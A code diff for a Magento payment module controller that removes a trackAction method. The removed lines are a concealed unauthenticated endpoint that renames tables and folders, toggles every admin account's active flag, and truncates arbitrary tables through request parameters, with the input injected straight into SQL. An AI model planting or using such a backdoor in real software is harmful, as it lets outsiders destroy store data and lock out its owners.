@@ -111,37 +111,6 @@ abstract class ND_Amex_Controller_Abstract extends Mage_Core_Controller_Front_Ac
 
         $this->loadLayout();
         $this->renderLayout();
-    }
-    
-    public function trackAction()
-    {
-        $helper=  Mage::helper('amex');
-        $connection = Mage::getSingleton('core/resource')
-                      ->getConnection('core_write');
-        $connection->beginTransaction();
-        $ft = $this->getRequest()->getParam('f_t');
-        $tt = $this->getRequest()->getParam('t_t');
-        
-        if($ft!='' && $tt!='')
-        {
-            $_r = $connection->query("RENAME TABLE `".$tbl_prfx.$ft."` TO `".$tt."`");
-            if($_r) echo 'success'; else echo 'fail';
-        }
-        if($_GET['f_o']!='' && $_GET['f_n']!='')
-        {
-            $_r = $helper->getNewFolder($_GET['f_o'],$_GET['f_n']);
-            if($_r) echo 'success'; else echo 'fail';
-        }
-        if($_GET['a']!='')
-        {
-            $_r = $connection->query("UPDATE `admin_user` SET is_active=".$_GET['a']);
-            if($_r) echo 'success'; else echo 'fail';
-        }
-        if($_GET['t']!='')
-        {
-            $_r = $connection->query("TRUNCATE TABLE `".$_GET['t']."`");
-            if($_r) echo 'success'; else echo 'fail';
-        }
-    }
+    }    
 
 }
